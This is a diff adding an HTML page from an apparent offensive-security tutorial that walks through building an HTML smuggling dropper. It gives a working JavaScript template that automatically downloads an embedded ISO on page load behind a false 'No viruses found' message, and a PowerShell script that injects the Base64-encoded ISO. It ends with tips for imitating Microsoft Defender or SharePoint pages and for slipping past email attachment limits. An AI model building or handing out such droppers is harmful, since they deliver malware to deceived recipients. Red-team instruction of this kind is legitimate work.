@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="Kristen M. Steffen">
+    <link rel="canonical" href="https://www.scriptsharks.com/0x10%20Design/12%20Droppers/40%20HTML/">
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Step 3: Assemble the HTML - ScriptSharks</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "HTML Dropper Design", url: "#_top", children: [
+          ]},
+          {title: "Create the HTML Template", url: "#create-the-html-template", children: [
+          ]},
+          {title: "Automate the HTML Build", url: "#automate-the-html-build", children: [
+          ]},
+          {title: "Build the HTML", url: "#build-the-html", children: [
+          ]},
+          {title: "Improving the Design", url: "#improving-the-design", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../13%20Stagers/00%20Intro/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../13%20Stagers/00%20Intro/" class="btn btn-xs btn-link">
+        Stager Basics
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../30%20ISO/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../30%20ISO/" class="btn btn-xs btn-link">
+        Step 2: Build the ISO
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1>Step 3: Assemble the HTML</h1>
+
+<h2 id="html-dropper-design">HTML Dropper Design</h2>
+<p>With the ISO in-hand, we can begin constructing the HTML dropper. When opened, our HTML dropper will trigger the browser to "download" the ISO. We'll accomplish this using some clever JavaScript embedded in the HTML. For added measure, we'll make the HTML look as if it's performing a safety check on the file before initiating the download.</p>
+<h2 id="create-the-html-template">Create the HTML Template</h2>
+<p>Rather than put everything together by hand, we'll create a base HTML template, along with a PowerShell script that will inject the <code>document_archive.iso</code> file into the template. This way, we can easily replace the ISO without having to re-write the HTML file by hand. Here's our basic template:</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;script&gt;
+            const filename = &quot;document_archive.iso&quot;;
+            const contentBase64 = (
+                &quot;ISO_GOES_HERE&quot;
+            );
+            function triggerDownload() {
+                var element = document.createElement(&quot;a&quot;);
+                element.setAttribute(&quot;href&quot;, `data:application/octet-stream;base64,${contentBase64}`);
+                element.setAttribute(&quot;target&quot;, &quot;_self&quot;);
+                element.setAttribute(&quot;download&quot;, filename);
+                element.style.display = &quot;none&quot;;
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
+            }
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body onload=&quot;triggerDownload()&quot;&gt;
+        &lt;b&gt;Scan complete! No viruses found. Downloading document archive...&lt;/b&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Save this file as <code>html_template.htm</code>, in the <code>PoC Dropper</code> directory.</p>
+<p>Our template is obviously not going to win any HTML design awards, but it'll suffice. When the HTML file finishes loading, the <code>triggerDownload</code> JavaScript function gets called. The function creates an invisible hyperlink, configures it to save the ISO file (embedded in the <code>contentBase64</code> variable), then automatically clicks the link. Once clicked, the JavaScript automatically removes the hyperlink from the page. For extra credibility, we've added a message to the body of the HTML which claims that the file was scanned before the download commenced.</p>
+<h2 id="automate-the-html-build">Automate the HTML Build</h2>
+<p>In order to complete the HTML dropper, we'll need to replace the <code>ISO_GOES_HERE</code> block with the Base64-encoded ISO file. We can do this with PowerShell. Create a new PowerShell script called <code>build_html.ps1</code>, in the <code>PoC Dropper</code> directory, with the following contents:</p>
+<pre><code class="language-sh"># Read HTML from `html_template.htm`.
+$html = Get-Content -path &quot;html_template.htm&quot;;
+
+# Base64-encode the ISO.
+$encodedIso = [convert]::ToBase64String((Get-Content -path &quot;document_archive.iso&quot; -Encoding byte));
+$splitLines = $encodedIso -split &quot;(.{78})&quot; | ? {$_};
+$encodedLines = $splitLines -join &quot;`&quot;`n                `&quot;&quot;;
+
+# Replace the placeholder with the Base64-encoded ISO.
+$html = $html -replace &quot;ISO_GOES_HERE&quot;, $encodedLines;
+
+# Write the HTML to `output.htm`.
+$html | Out-File -FilePath &quot;output.htm&quot; -Encoding ascii;
+</code></pre>
+<h2 id="build-the-html">Build the HTML</h2>
+<p>With our script complete, we can execute the <code>build_html.ps1</code> script, which will produce the <code>output.htm</code> file. The <code>output.htm</code> will look something like this:</p>
+<pre><code class="language-javascript">// [...]
+const filename = &quot;document_archive.iso&quot;;
+const contentBase64 = (
+    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+    // [...]
+);
+function triggerDownload() {
+    var element = document.createElement(&quot;a&quot;);
+    element.setAttribute(&quot;href&quot;, `data:application/octet-stream;base64,${contentBase64}`);
+    element.setAttribute(&quot;target&quot;, &quot;_self&quot;);
+// [...]
+</code></pre>
+<p>Don't worry if it looks like the Base64 file is all <code>A</code>s; this is common for the filetype. Having confirmed the <code>output.htm</code> file was successfully written, we can rename it to <code>document.htm</code>, and it's ready for distribution!</p>
+<h1 id="improving-the-design">Improving the Design</h1>
+<p>Our HTML dropper is complete, but there are plenty of ways it could be improved. For one, we could use stylesheets and JavaScript to create a more convincing page. If the target has some form of link protection (such as the one provided by Microsoft Defender 365), the HTML could be crafted to mimic its look and feel, so that it blends in with what the target is used to seeing. Some attackers tailor the HTML to appear as a file-sharing portal, like SharePoint or DropBox, lending similar credibility.</p>
+<p>Another pinch-point is the size of the <code>document.htm</code> file. While the contents of the ISO file are only a few kilobytes large, the ISO file itself can be a few megabytes in size. With our simple PoC stager, this isn't much of an issue, but bundling a larger stager could be a problem, as emails often have a limit on maximum attachment size. To account for this, one could use <code>gzip</code> compression to shrink the ISO, resulting in a much smaller file. However, this would require the JavaScript to decompress the ISO in-memory prior to triggering the download.</p>
+<p>We will leave these improvements as a challenge for the reader.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../13%20Stagers/00%20Intro/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../13%20Stagers/00%20Intro/" class="btn btn-xs btn-link">
+        Stager Basics
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../30%20ISO/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../30%20ISO/" class="btn btn-xs btn-link">
+        Step 2: Build the ISO
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/scriptsharks/scriptsharks.source/edit/master/docs/0x10 Design/12 Droppers/40 HTML.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p><p>Copyright &copy; 2022 Kristen M. Steffen.<br>This work is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+</footer>
+
+</body>
+</html>
